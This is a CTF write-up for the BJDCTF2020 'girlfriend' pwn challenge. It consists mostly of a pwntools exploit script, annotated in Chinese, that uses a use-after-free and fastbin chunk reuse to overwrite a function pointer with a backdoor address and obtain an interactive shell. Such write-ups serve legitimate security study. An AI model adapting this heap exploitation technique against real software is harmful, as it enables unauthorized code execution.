---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: BJDCTF2020 girlfriend-wp
date: 2023-06-12 10:49:22
tags:
- CTF
- pwn
- heap
- BJDCTF2020
- nssctf
categories:
- pwn-wp
---
[相关资源](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/12/BJDCTF2020-girlfriend-wp)

## use after free
```python
from pwn import *
from ctypes import *
context.log_level = 'debug'
pty = process.PTY

proc = process("./girlfriend", stdin=pty, stdout=pty)
# proc = remote("node2.anna.nssctf.cn", 28783)
belf = ELF("./girlfriend")
libc = ELF("/usr/ctf/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")

def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()

def add(size, con):
    sla(b'choice :', b'1')
    sla(b'size is :', str(size).encode())
    sa(b'name is :', con)

def dlt(idx):
    sla(b'choice :', b'2')
    sla(b'Index :', str(idx).encode())

def shw(idx):
    sla(b'choice :', b'3')
    sla(b'Index :', str(idx).encode())

gscript = '''
    b add_girlfriend
    b del_girlfriend
    hook-bins
    memory watch 0x00000000006020A0 6 qword
'''
# gdb.attach(proc, gdbscript=gscript)

backdoor = 0x0000000000400B9C

add(0x10, p64(backdoor))    #add时先分配 struc_ptr 再分配 name_ptr
add(0x20, p64(backdoor))
dlt(0)      # delete的时候先free  name_ptr 再free struc_ptr
dlt(1)      # 所以name_ptr 先进入fastbin
# 两次delete结束后fastbin: 
# [0x20] chunk3(struc_ptr) -> chunk1(struc_ptr) -> chunk2(name_ptr)
# [0x30] chunk4(name_ptr)
# 再次add, chunk1 会被当做 name_ptr
# 这样就可以复写它的 func_ptr, 再执行show，就执行了后门函数
add(0x10, p64(backdoor))
shw(0)
pi()
```
> 个人博客 https://antel0p3.github.io/